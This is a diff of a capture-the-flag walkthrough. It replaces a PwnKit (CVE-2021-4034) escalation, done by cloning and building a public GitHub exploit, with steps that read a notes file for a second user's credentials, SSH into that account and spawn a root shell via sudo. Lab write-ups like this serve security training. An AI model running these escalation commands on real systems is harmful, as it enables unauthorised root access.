@@ -56,28 +56,33 @@ Once logged in as the 'webmaster' user, retrieve the first flag:
 
 ---
 
-## 5. 📈 Privilege Escalation
+## 5. 📓 Discovering Further Credentials
 
-Run LinPEAS to enumerate potential privilege escalation vectors:
+Inside the `webmaster` home directory, view the `Notes.txt` file:
 
 ```bash
-./linpeas.sh
+cat Notes.txt
 ```
 
-The system was found vulnerable to **CVE-2021-4034 (PwnKit)**. Exploit this vulnerability using the public GitHub exploit:
+This file reveals credentials for a second user: `linuxmaster`.
+
+Use the discovered credentials to SSH into that account:
 
 ```bash
-git clone https://github.com/berdav/CVE-2021-4034.git
-cd CVE-2021-4034
-make
-./cve-2021-4034
+ssh linuxmaster@localhost
 ```
 
 ---
 
 ## 6. 🏁 Root Access
 
-After successful exploitation, read the root flag:
+From the `linuxmaster` account, escalate privileges using `sudo`:
+
+```bash
+sudo --preserve-env=PATH /bin/bash
+```
+
+This command preserves environment variables and grants a root shell. Retrieve the root flag:
 
 ```bash
 cat /root/root_flag.txt
